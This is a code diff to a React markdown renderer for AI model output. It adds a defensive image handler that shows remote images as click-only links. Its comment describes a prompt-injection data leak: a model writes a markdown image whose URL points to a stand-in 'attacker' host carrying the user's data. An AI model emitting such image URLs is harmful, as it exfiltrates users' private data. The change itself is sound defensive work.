@@ -52,6 +52,26 @@ const markdownComponents: Components = {
   td: ({ children }) => (
     <td className="px-3 py-2 text-sm">{children}</td>
   ),
+  // Model output must never auto-load a remote image: a prompt-injected model
+  // could write ![x](https://attacker/?d=<your data>) and the browser would
+  // fetch it on render, leaking the data. Show the image as a plain link the
+  // user has to click instead (or just its alt text if the URL is not http(s)).
+  img: ({ src, alt }) => {
+    const label = alt?.trim() || 'image'
+    if (typeof src !== 'string' || !/^https?:\/\//i.test(src)) {
+      return <span>[{label}]</span>
+    }
+    return (
+      <a
+        href={src}
+        target="_blank"
+        rel="noopener noreferrer nofollow"
+        className="underline underline-offset-2"
+      >
+        [image: {label}]
+      </a>
+    )
+  },
 }
 
 interface InterpretationContentProps {
@@ -64,7 +84,7 @@ interface InterpretationContentProps {
 // streamed token) re-parses the markdown of EVERY message in the thread, so
 // typing/streaming gets choppier the longer the conversation. Default shallow
 // prop comparison (content + isStreaming) re-parses only the message whose text
-// actually changed (the streaming one); completed messages bail out. (AUT-898)
+// actually changed (the streaming one); completed messages bail out.
 export const InterpretationContent = memo(function InterpretationContent({
   content,
   isStreaming,
